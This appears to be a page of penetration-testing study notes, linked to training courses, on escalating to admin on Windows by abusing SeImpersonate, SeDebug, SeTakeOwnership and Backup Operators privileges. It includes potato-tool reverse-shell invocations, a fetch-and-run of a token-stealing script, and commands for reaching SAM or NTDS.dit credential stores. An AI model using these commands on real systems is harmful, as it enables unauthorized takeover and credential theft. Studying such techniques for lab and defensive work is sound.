# Privileges

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![windowsprivesc20](../../../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)

<div class="row row-cols-lg-2"><div>

Users may have privileges for running some system tasks such as backups that may be used to escalate.

You can list your privileges with the command below, **but**, you won't see all of them unless you're in an admin prompt.

```shell!
PS> whoami /priv
PS> # your groups can have privileges too!
```

Privileges are [listed and explained here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
</div><div>

You can find way to exploit them on: 

* [Priv2Admin](https://github.com/gtworek/Priv2Admin) <small>(1.7k ⭐)</small>
* [PrivFu](https://github.com/daem0nc0re/PrivFu/) <small>(0.7k ⭐)</small>
* ...

</div></div>

<hr class="sep-both">

## NormalPrompt2Admin

<div class="row row-cols-lg-2"><div>

You may use these as a normal user to escalate to admin.

#### SeImpersonate — steal access tokens

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
 
The most common approach is to use [potato](/cybersecurity/red-team/s4.privesc/windows/tools/potato.md) scripts. 

```ps
PS> # You can pick any port for -l. It's for DCOM traffic. 
PS> .\JuicyPotato.exe -l any_port -p c:\windows\system32\cmd.exe -a "/c <reverse shell command>" -t *
````

You can use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) <small>(1.7k ⭐, 2020 🪦)</small>:

````ps
PS> .\PrintSpoofer.exe -c "<reverse shell command>"
````

Additional references:

* [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) <small>(0.5k ⭐, 2020 🪦)</small> using [WinRM](/operating-systems/networking/protocols/winrm.md)
* [token-priv](https://github.com/hatRiot/token-priv/tree/master) <small>(0.7k ⭐, 2017 🪦)</small>
</div><div>
</div></div>

<hr class="sep-both">

## ElevatedPromptToAdmin

<div class="row row-cols-lg-2"><div>

You may use these from an elevated prompt to escalate to admin.

#### SeDebugPrivilege — Dump Process Memory

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

We can use methods shown in [Dump Credentials From LSASS Process](/operating-systems/windows/security/index.md#dump-credentials-from-lsass-process) to dump a process memory, which is often LSASS.

We can also steal and reuse the parent [access token](/operating-systems/windows/security/index.md#access-token) such as LSASS.

```ps
PS> wget "https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1" -O psgetsys.ps1
PS> .\psgetsys.ps1
PS> [MyProcess]::CreateProcessFromParent(<target_process_pid>,"<command_to_execute>","")
```

➡️ See also: [PrivFu/SeDebugPrivilegePoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC).
</div><div>

#### SeTakeOwnershipPrivilege — Takeover Any File/Folder

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

You could access the SAM database or NTDS.dit...

```shell!
PS> takeown /f 'C:\poc.txt'
PS> icacls 'C:\poc.txt' /grant my_username:F
```
</div></div>

<hr class="sep-both">

## GroupToAdmin

<div class="row row-cols-lg-2"><div>

#### Backup Operators — Access any file

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

*-- Grants SeBackup and SeRestore privileges --*

We can use [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) <small>(0.2k ⭐, 2013 🪦)</small> to enable/disable the privilege and exploit it.

```shell!
PS> Import-Module .\SeBackupPrivilegeUtils.dll
PS> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS> Get-SeBackupPrivilege # is enabled?
PS> Set-SeBackupPrivilege # enable it
```

We can use `robocopy` to perform a backup copy:

```shell!
PS> robocopy /B <source_folder> <dest_folder> <filename>
```

You could access the SAM database or NTDS.dit...
</div><div>
</div></div>